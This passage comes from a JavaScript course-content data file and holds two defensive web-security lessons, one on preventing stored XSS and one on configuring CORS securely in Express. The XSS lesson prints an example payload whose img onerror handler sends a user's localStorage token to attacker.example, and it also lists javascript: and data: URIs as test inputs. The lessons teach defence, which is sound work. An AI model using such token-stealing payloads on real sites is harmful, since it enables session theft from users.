- **Output Encoding / Escaping**: Converting special HTML characters (\`<\`, \`>\`, \`&\`, \`"\`, \`'\`) into inert character entities (\`&lt;\`, \`&gt;\`) so the browser displays them as literal text rather than executing them as HTML tags.`,
          order: 1,
        },
        {
          heading: 'How Stored XSS Happens and How to Stop It',
          body: `Imagine an attacker submits the following payload as a course title or external reference link:

\`\`\`
Title: <img src="x" onerror="fetch('https://attacker.example/steal?token=' + localStorage.getItem('token'))" />
URL:   javascript:fetch('https://attacker.example/steal')
\`\`\`

\`\`\`
Attacker submits malicious script in POST / PATCH request
   │
   ▼
[Express Backend]
   ├─► If unvalidated & rendered as raw HTML:
   │     Saved in MongoDB -> Victim opens page -> Victim's browser executes script!
   │
   └─► When properly defended:
         1. Backend validates input types, strips control chars, and enforces https:// on URLs.
         2. Backend responds with Content-Type: application/json (never raw HTML).
         3. React renders {topic.title} as escaped text nodes, never via dangerouslySetInnerHTML.
         4. Sensitive refresh tokens live in HttpOnly cookies (invisible to document.cookie).
\`\`\`

Notice how backend and frontend responsibilities complement each other:
- **Backend Responsibility**: Validate field lengths and types, reject unsafe URL schemes (\`javascript:\`, \`data:\`), strip dangerous HTML or control characters when plain text is expected, and always return \`Content-Type: application/json; charset=utf-8\`.
- **Frontend Responsibility**: Render dynamic text using standard JSX expressions (\`<h1>{topic.title}</h1>\`) which automatically escape HTML tags, and avoid \`dangerouslySetInnerHTML\` or \`eval()\`.`,
          order: 2,
        },
        {
          heading: 'Validating URLs to Prevent javascript: URI Attacks',
          body: `One of the most overlooked XSS vectors is the \`href\` attribute of an \`<a>\` tag or the \`src\` attribute of an \`<img>\` tag. Even if React escapes text inside \`<a>{ref.title}</a>\`, if \`ref.url\` contains \`"javascript:alert(document.domain)"\`, clicking the link \`<a href={ref.url}>\` can trigger JavaScript execution in the browser!

In LearnSphere, topics can contain \`externalReferences\` (documentation links) and \`images\`. Whenever your backend accepts a URL from a user or Course Creator:
1. Parse the URL using Node's built-in \`new URL(inputUrl)\` constructor inside a \`try / catch\` block.
2. Verify that \`parsedUrl.protocol\` is strictly \`'https:'\` (or \`'http:'\` when explicitly permitted for local development).
3. Reject any URL using \`javascript:\`, \`data:\`, \`file:\`, or \`vbscript:\` protocols with \`400 Bad Request\`.`,
          order: 3,
        },
        {
          heading: 'Why JSON APIs and HttpOnly Cookies Limit XSS Impact',
          body: `Two backend design choices in LearnSphere dramatically reduce the risk and blast radius of XSS:

1. **Strict \`application/json\` Responses**:
   LearnSphere's Express API returns structured JSON via \`res.json(...)\` alongside Helmet's \`X-Content-Type-Options: nosniff\` header. This prevents browsers from "sniffing" a JSON API response and mistakenly rendering it as an executable \`text/html\` document (Reflected XSS).

2. **HttpOnly Refresh Cookies**:
   In LearnSphere, long-lived refresh tokens are stored in cookies with the \`httpOnly: true\` flag (\`server/controllers/authController.js\`). JavaScript running in the browser (\`document.cookie\`) cannot read \`HttpOnly\` cookies at all, protecting long-lived sessions from script theft.`,
          order: 4,
        },
        {
          heading: 'Common Beginner Mistakes',
          body: `- **Allowing arbitrary strings in URL fields**: Accepting any string for \`websiteUrl\`, \`avatarUrl\`, or \`externalReferences[].url\` without verifying that the protocol is \`https:\`.
- **Echoing raw user input in HTML error pages**: Sending \`res.send("<h1>Could not find: " + req.query.search + "</h1>")\`, which creates an immediate Reflected XSS vulnerability. Always return JSON error objects (\`res.status(404).json({ error: 'Not Found', message: '...' })\`).
- **Using \`dangerouslySetInnerHTML\` on user-submitted content**: Rendering database fields as raw HTML on the frontend without strict sanitization.
- **Storing long-lived tokens in \`localStorage\`**: Anything in \`localStorage\` can be read by any script running on the page.`,
          order: 5,
        },
        {
          heading: 'Suggested Practice Task',
          body: `Write a backend validation function \`isValidHttpsUrl(urlString)\` using Node's native \`URL\` class that:
1. Returns \`false\` if \`urlString\` is not a string or exceeds 1000 characters.
2. Uses \`new URL(urlString)\` to parse the string.
3. Returns \`true\` only if \`parsed.protocol === 'https:'\` and \`Boolean(parsed.hostname)\`.
4. Test it against \`"https://nodejs.org/en/docs"\` (\`true\`), \`"javascript:alert(1)"\` (\`false\`), and \`"data:text/html,<script>alert(1)</script>"\` (\`false\`).`,
          order: 6,
        },
        {
          heading: 'Topic Summary',
          body: `- Cross-Site Scripting (XSS) happens when untrusted input is executed as code in a user's browser.
- Stored XSS persists malicious payloads in the database; Reflected XSS echoes untrusted input directly in an HTTP response.
- Always validate URLs on the backend using \`new URL()\` and whitelist only safe protocols (\`https:\`), rejecting \`javascript:\` and \`data:\` URIs.
- Always return \`application/json\` from API endpoints, use \`X-Content-Type-Options: nosniff\`, and store sensitive refresh tokens in \` httpOnly\` cookies.`,
          order: 7,
        },
      ],
    },
    codeExamples: [
      {
        title: 'Validating Safe HTTPS URLs and Sanitizing Plain-Text Input on the Backend',
        language: 'javascript',
        code: `/**
 * Validates that a candidate URL is a well-formed HTTPS URL.
 * Rejects javascript:, data:, vbscript:, and malformed strings.
 */
export function isSafeHttpsUrl(candidate) {
  if (typeof candidate !== 'string') return false;
  const trimmed = candidate.trim();
  if (trimmed.length === 0 || trimmed.length > 1000) return false;

  try {
    const parsed = new URL(trimmed);
    return parsed.protocol === 'https:' && Boolean(parsed.hostname);
  } catch {
    return false;
  }
}

/**
 * Strips ASCII control characters and trims plain-text fields
 */
export function sanitizePlainText(input, maxLength = 500) {
  if (typeof input !== 'string') return '';
  return input
    .replace(/[\\u0000-\\u0008\\u000B\\u000C\\u000E-\\u001F\\u007F]/g, '')
    .trim()
    .slice(0, maxLength);
}

/**
 * Express middleware validating externalReferences in a topic content update
 */
export function validateExternalReferences(req, res, next) {
  const { externalReferences } = req.body;
  if (externalReferences === undefined) return next();

  if (!Array.isArray(externalReferences)) {
    return res.status(400).json({
      error: 'Bad Request',
      message: 'externalReferences must be an array.',
    });
  }

  for (const ref of externalReferences) {
    if (!ref || typeof ref !== 'object' || !isSafeHttpsUrl(ref.url)) {
      return res.status(400).json({
        error: 'Bad Request',
        message: 'Every external reference must contain a valid https:// URL.',
      });
    }
  }

  next();
}`,
        explanation:
          'isSafeHttpsUrl parses candidate URLs using the standard WHATWG URL constructor and strictly enforces the https: protocol. If an attacker attempts to store a javascript:alert(1) or data: URI inside externalReferences, the middleware rejects the request with 400 Bad Request.',
      },
    ],
    importantPoints: [
      'Stored XSS occurs when malicious scripts or unsafe URLs are saved in the database and later rendered in another user’s browser.',
      'Always validate user-supplied URLs on the backend and allow only safe protocols (https:), blocking javascript: and data: URIs.',
      'API endpoints should return application/json responses with X-Content-Type-Options: nosniff, never raw unescaped HTML strings.',
      'Keep plain-text fields clean by trimming whitespace, enforcing max lengths, and stripping unexpected control characters.',
      'Storing refresh tokens in HttpOnly cookies ensures client-side scripts cannot read them via document.cookie.',
    ],
    externalReferences: [
      {
        title: 'OWASP Cross-Site Scripting (XSS) Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
        source: 'OWASP Cheat Sheet Series',
      },
      {
        title: 'MDN Web Docs: Cross-Site Scripting (XSS)',
        url: 'https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting',
        source: 'Mozilla Developer Network (MDN)',
      },
    ],
    videos: { english: null, telugu: null, hindi: null },
    images: [],
  },

  // =========================================================================
  // TOPIC 5: CORS
  // =========================================================================
  {
    topicId: '6abe9ddcf15c2b4f6008ac5e',
    title: 'CORS',
    content: {
      explanation:
        'Web browsers enforce a critical security rule called the Same-Origin Policy (SOP), which prevents JavaScript on a malicious website (like https://evil-site.example) from silently making background fetch() requests to your backend API (like https://api.learnsphere.io) and reading your users’ private data. However, in modern full-stack development, your legitimate frontend and backend often run on different origins—for example, a Vite React dev server on http://localhost:3000 calling an Express API on http://localhost:5000. Cross-Origin Resource Sharing (CORS) is an HTTP header mechanism that lets your Express backend explicitly declare which external origins, HTTP methods, headers, and credentials are trusted to access its responses in a browser.',
      sections: [
        {
          heading: 'Learning Objectives',
          body: `- Define what an "Origin" is (scheme + hostname + port) and why browsers enforce the Same-Origin Policy.
- Understand how CORS headers (\`Access-Control-Allow-Origin\`, \`Access-Control-Allow-Credentials\`, \`Access-Control-Allow-Methods\`, \`Access-Control-Allow-Headers\`) work.
- Distinguish between Simple Requests and Preflight (\`OPTIONS\`) Requests.
- Configure the \`cors\` middleware in Express using a strict allowlist of trusted origins.
- Understand why \`Access-Control-Allow-Origin: *\` is insecure for authenticated APIs and why CORS does not replace server-side authentication.`,
          order: 0,
        },
        {
          heading: 'Core Terminology',
          body: `- **Origin**: The combination of URI scheme (protocol), hostname (domain), and port number—for example, \`http://localhost:3000\`. Two URLs have the same origin only if all three match exactly.
- **Same-Origin Policy (SOP)**: A built-in browser security mechanism that restricts scripts loaded from one origin from reading responses from a different origin unless explicitly permitted by CORS headers.
- **CORS (Cross-Origin Resource Sharing)**: A standard set of HTTP response headers sent by a server to tell the browser which cross-origin websites are permitted to read responses.
- **Preflight Request (\`OPTIONS\`)**: An automatic check sent by the browser before executing cross-origin requests that use methods like \`PATCH\`/\`DELETE\`, custom headers like \`Authorization\`, or \`Content-Type: application/json\`.
- **Credentialed Request**: A cross-origin request that includes cookies (such as LearnSphere's \`httpOnly\` refresh token cookie) or \`Authorization\` headers, enabled via \`credentials: 'include'\` on the client and \`credentials: true\` on the server.`,
          order: 1,
        },
        {
          heading: 'How Browser CORS Preflight and Actual Requests Work',
          body: `When your React app at \`http://localhost:3000\` sends a \`PATCH\` request with \`Content-Type: application/json\` and an \`Authorization: Bearer <token>\` header to \`http://localhost:5000/api/creator/courses/...\`, the browser performs a two-step handshake:

\`\`\`
[Browser: http://localhost:3000]                     [Express Server: http://localhost:5000]
       │                                                                │
       │  1. Preflight Request:                                         │
       │     OPTIONS /api/creator/courses/123                           │
       │     Origin: http://localhost:3000                              │
       │     Access-Control-Request-Method: PATCH                       │
       │     Access-Control-Request-Headers: content-type,authorization │
       ├───────────────────────────────────────────────────────────────►│
       │                                                                │ Checks if Origin is
       │  2. Preflight Response (204 No Content):                       │ in allowedOrigins list
       │     Access-Control-Allow-Origin: http://localhost:3000         │
       │     Access-Control-Allow-Credentials: true                     │
       │     Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE    │
       │     Access-Control-Allow-Headers: Content-Type,Authorization   │
       │◄───────────────────────────────────────────────────────────────┤
       │                                                                │
       │  3. Actual Request:                                            │
       │     PATCH /api/creator/courses/123                             │
       │     Origin: http://localhost:3000                              │
       │     Authorization: Bearer <jwt>                                │
       ├───────────────────────────────────────────────────────────────►│
       │                                                                │
       │  4. Actual JSON Response (200 OK)                              │
       │◄───────────────────────────────────────────────────────────────┤
\`\`\`

If the request comes from an untrusted origin like \`https://malicious.example\`, the Express server rejects the CORS check (in LearnSphere, \`errorHandler.js\` returns \`403 Forbidden: Access denied by CORS policy\`), and the browser blocks the malicious script from proceeding.`,
          order: 2,
        },
        {
          heading: 'How LearnSphere Configures CORS Securely',
          body: `In \`server/server.js\`, LearnSphere configures the \`cors\` middleware with an explicit allowlist derived from environment variables (\`CLIENT_URL\` and \`APP_URL\`) plus local development origins:

1. **Dynamic Origin Validation Function**:
   - Requests without an \`Origin\` header (such as same-origin requests, server-to-server requests, or health checks) are allowed through.
   - Browser requests with an \`Origin\` header are checked against \`allowedOrigins\`.
   - If the origin is not trusted, the callback passes \`new Error('CORS request blocked: origin not allowed')\`, which \`errorHandler.js\` translates into a clean \`403 Forbidden\` JSON response.
2. **Explicit Credentials, Methods, and Headers**:
   - \`credentials: true\` allows the browser to send and receive the \`httpOnly\` refresh token cookie.
   - \`methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']\` and \`allowedHeaders: ['Content-Type', 'Authorization']\` restrict cross-origin operations to expected REST conventions.`,
          order: 3,
        },
        {
          heading: 'What CORS Protects Against (and What It Does Not)',
          body: `It is crucial to understand the exact scope of CORS:
- **What CORS protects**: CORS protects **users in web browsers** from having their authenticated sessions or readable API responses abused by scripts running on untrusted third-party websites.
- **What CORS does NOT protect**: Non-browser clients like \`curl\`, Postman, or Python scripts **do not enforce CORS** and can spoof or omit any \`Origin\` header they want. Therefore, **CORS is never a substitute for authentication, authorization, or input validation**. Every protected route still requires JWT verification and role/ownership checks.`,
          order: 4,
        },
        {
          heading: 'Common Beginner Mistakes',
          body: `- **Using \`app.use(cors())\` with default wildcard (\`*\`) in production**: Calling \`cors()\` with no arguments sets \`Access-Control-Allow-Origin: *\`, allowing any website on the internet to read your public API responses from a browser.
- **Combining \`origin: '*'\` with \`credentials: true\`**: Browsers strictly forbid wildcard origins when \`Access-Control-Allow-Credentials: true\` is set. You must validate and echo the specific trusted origin.
- **Reflecting any arbitrary \`Origin\` header blindly**: Setting \`origin: true\` without checking an allowlist is equivalent to allowing every malicious website on the internet to make credentialed requests to your backend.
- **Mistaking CORS for API authentication**: Thinking that blocking unknown origins in CORS stops attackers from calling your API via \`curl\` or backend scripts.`,
          order: 5,
        },
        {
          heading: 'Suggested Practice Task',
          body: `1. Examine how an Express server responds when you send a request with a trusted origin header versus an untrusted origin header:
   - Trusted: \`curl -i -H "Origin: http://localhost:3000" http://localhost:5000/api/health\`
   - Untrusted: \`curl -i -H "Origin: https://evil.example.com" http://localhost:5000/api/health\`
2. Verify that the trusted request includes the \`Access-Control-Allow-Origin: http://localhost:3000\` response header, while the untrusted request returns \`403 Forbidden\` with \`"Access denied by CORS policy."\``,
          order: 6,
        },
        {
          heading: 'Topic Summary',
          body: `- An Origin consists of scheme + hostname + port; browsers block cross-origin reads by default under the Same-Origin Policy.
- CORS uses server response headers to allow only trusted frontend origins to interact with your API from a browser.
- Complex requests (\`PATCH\`, \`DELETE\`, \`Authorization\` headers, \`application/json\`) trigger an automatic \`OPTIONS\` preflight request first.
- Always configure CORS with an explicit origin allowlist from environment variables, and remember that server-side authentication is still required because non-browser tools ignore CORS.`,
          order: 7,
        },
      ],
    },
    codeExamples: [
      {
        title: 'Production-Ready Allowlist CORS Configuration in Express',
        language: 'javascript',
        code: `import express from 'express';
import cors from 'cors';

const app = express();

// Build explicit allowlist from environment variables
const configuredClientUrl = process.env.CLIENT_URL || '';
const allowedOrigins = [
  ...configuredClientUrl.split(',').map((url) => url.trim()).filter(Boolean),
  'http://localhost:3000',
  'http://127.0.0.1:3000',
];

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow same-origin or server-to-server requests that omit the Origin header
      if (!origin) {
        return callback(null, true);
      }

      if (allowedOrigins.includes(origin)) {
        return callback(null, true);
      }

      // Reject untrusted browser origins
      return callback(new Error('CORS request blocked: origin not allowed'));
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  })
);`,
        explanation:
          'Instead of allowing all origins with a wildcard (*), this configuration checks the incoming Origin header against a curated allowlist populated from process.env.CLIENT_URL. Trusted origins receive Access-Control-Allow-Origin and Access-Control-Allow-Credentials headers, while unknown origins trigger a controlled CORS error.',
      },
    ],
    importantPoints: [
      'Two URLs share the same origin only if their protocol, hostname, and port match identically.',
      'CORS is enforced by web browsers to protect users from malicious cross-site requests; CLI tools like curl ignore CORS.',
      'Browsers send an OPTIONS preflight request before cross-origin requests that use JSON bodies, custom headers, or PATCH/DELETE methods.',
      'When credentials: true is enabled (for cookies or Authorization headers), Access-Control-Allow-Origin cannot be a wildcard (*).',
      'Always validate origins against an explicit allowlist configured via environment variables such as CLIENT_URL.',
    ],
    externalReferences: [
      {
        title: 'MDN Web Docs: Cross-Origin Resource Sharing (CORS)',
        url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS',
        source: 'Mozilla Developer Network (MDN)',
      },
      {
        title: 'Express CORS Middleware Documentation',
        url: 'https://expressjs.com/en/resources/middleware/cors.html',
        source: 'Express.js Official Documentation',
      },
    ],
    videos: { english: null, telugu: null, hindi: null },
    images: [],
  },
];
